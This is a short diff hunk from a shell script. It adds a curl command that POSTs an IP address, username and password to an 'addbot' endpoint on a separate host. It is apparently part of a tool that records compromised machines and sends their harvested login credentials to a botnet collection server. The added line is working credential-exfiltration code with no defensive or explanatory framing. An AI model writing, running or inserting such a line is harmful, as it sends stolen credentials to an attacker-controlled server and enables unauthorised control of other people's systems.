@@ -33,6 +33,7 @@ else
 		echo ""
 		exit 0
 	fi
+	curl --header "Content-Type: application/json" --request POST --data "{\"ip\":\"$1\",\"username\":\"$uname\",\"password\":\"$pass\"}" http://192.168.1.4:5000/addbot
 	echo "$val" >>$OUTPUTFILE
         echo "$val added"
 fi
